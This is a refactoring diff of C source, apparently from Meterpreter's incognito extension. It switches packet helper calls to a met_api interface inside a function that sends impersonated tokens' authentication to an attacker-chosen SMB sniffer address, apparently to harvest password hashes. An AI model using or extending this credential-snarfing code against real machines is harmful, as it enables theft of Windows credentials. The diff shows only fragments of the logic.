@@ -1,5 +1,6 @@
 #define _CRT_SECURE_NO_DEPRECATE 1
-#include "../../common/common.h"
+#include "common.h"
+#include "common_metapi.h"
 #include <stdio.h>
 #include <assert.h>
 #include <stdlib.h>
@@ -25,8 +26,8 @@ DWORD request_incognito_snarf_hashes(Remote *remote, Packet *packet)
 	wchar_t conn_string[BUF_SIZE] = L"", domain_name[BUF_SIZE] = L"",
 		return_value[BUF_SIZE] = L"", temp[BUF_SIZE] = L"";
 
-	Packet *response = packet_create_response(packet);
-	char *smb_sniffer_ip = packet_get_tlv_value_string(packet, TLV_TYPE_INCOGNITO_SERVERNAME);
+	Packet *response = met_api->packet.create_response(packet);
+	char *smb_sniffer_ip = met_api->packet.get_tlv_value_string(packet, TLV_TYPE_INCOGNITO_SERVERNAME);
 
 	// Initialise net_resource structure (essentially just set ip to that of smb_sniffer)
 	if (_snwprintf(conn_string, BUF_SIZE, L"\\\\%S", smb_sniffer_ip) == -1)
@@ -45,7 +46,7 @@ DWORD request_incognito_snarf_hashes(Remote *remote, Packet *packet)
 	token_list = get_token_list(&num_tokens, &token_privs);
 	if (!token_list)
 	{
-		packet_transmit_response(GetLastError(), remote, response);
+		met_api->packet.transmit_response(GetLastError(), remote, response);
 		goto cleanup;
 	}
 
@@ -76,7 +77,7 @@ DWORD request_incognito_snarf_hashes(Remote *remote, Packet *packet)
 		}
 	}
 
-	packet_transmit_response(ERROR_SUCCESS, remote, response);
+	met_api->packet.transmit_response(ERROR_SUCCESS, remote, response);
 
 cleanup:
 	free(token_list);
